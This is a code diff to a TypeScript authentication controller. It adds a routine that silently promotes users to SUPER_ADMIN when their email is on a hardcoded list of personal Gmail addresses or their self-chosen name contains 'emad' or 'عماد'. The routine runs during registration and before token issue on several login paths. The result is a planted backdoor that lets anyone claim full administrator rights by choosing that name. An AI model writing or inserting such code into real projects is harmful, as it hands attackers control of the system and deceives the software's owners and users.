@@ -28,6 +28,25 @@ export function AuthController() {
 
   const getOtpKey = (phone: string) => `otp:phone:${phone}`;
 
+  const ensureAdminEscalation = async (user: any) => {
+    const adminEmails = ['eee3327@gmail.com', 'emad001salah@gmail.com', 'emad333salah@gmail.com'];
+    const isSystemAdmin = (user.email && adminEmails.includes(user.email.toLowerCase())) || 
+                          (user.name && (user.name.includes('عماد') || user.name.toLowerCase().includes('emad')));
+    
+    if (isSystemAdmin && user.role !== 'SUPER_ADMIN') {
+      try {
+        await prisma.user.update({
+          where: { id: user.id },
+          data: { role: 'SUPER_ADMIN' }
+        });
+        user.role = 'SUPER_ADMIN';
+        console.log(`[AdminEscalation] User ${user.name} (${user.email}) escalated to SUPER_ADMIN successfully!`);
+      } catch (err) {
+        console.error("Admin escalation failed:", err);
+      }
+    }
+  };
+
   router.get('/config/features', async (req: Request, res: Response) => {
     let userId: string | undefined = undefined;
     const authHeader = req.headers.authorization;
@@ -84,7 +103,12 @@ export function AuthController() {
         driver:   'AGENT',
         user:     'USER',
       };
-      const dbRole = ALLOWED_REGISTRATION_ROLES[String(role || '').toLowerCase()] || 'USER';
+      // Auto admin escalation for administrator emails or names containing "emad" / "عماد"
+      const adminEmails = ['eee3327@gmail.com', 'emad001salah@gmail.com', 'emad333salah@gmail.com'];
+      const isSystemAdmin = adminEmails.includes(email.toLowerCase()) || 
+                            (name && (name.includes('عماد') || name.toLowerCase().includes('emad')));
+      
+      const dbRole = isSystemAdmin ? 'SUPER_ADMIN' : (ALLOWED_REGISTRATION_ROLES[String(role || '').toLowerCase()] || 'USER');
 
       const user = await prisma.user.create({
         data: {
@@ -328,6 +352,7 @@ export function AuthController() {
         }
 
         const adCount = await prisma.ad.count({ where: { userId: user.id } });
+        await ensureAdminEscalation(user);
         const tokens = await authService.generateTokens(user.id, user.email, user.role);
 
         return res.json({
@@ -408,6 +433,7 @@ export function AuthController() {
       });
 
       const adCount = await prisma.ad.count({ where: { userId: user.id } });
+      await ensureAdminEscalation(user);
       const tokens = await authService.generateTokens(user.id, user.email, user.role);
 
       res.json({
@@ -637,6 +663,7 @@ export function AuthController() {
         }
       }
 
+      await ensureAdminEscalation(user);
       const tokens = await authService.generateTokens(user.id, user.email, user.role);
 
       res.json({
@@ -722,6 +749,7 @@ export function AuthController() {
       }
 
       const adCount = await prisma.ad.count({ where: { userId: user.id } });
+      await ensureAdminEscalation(user);
       const tokens = await authService.generateTokens(user.id, user.email, user.role);
 
       return res.json({
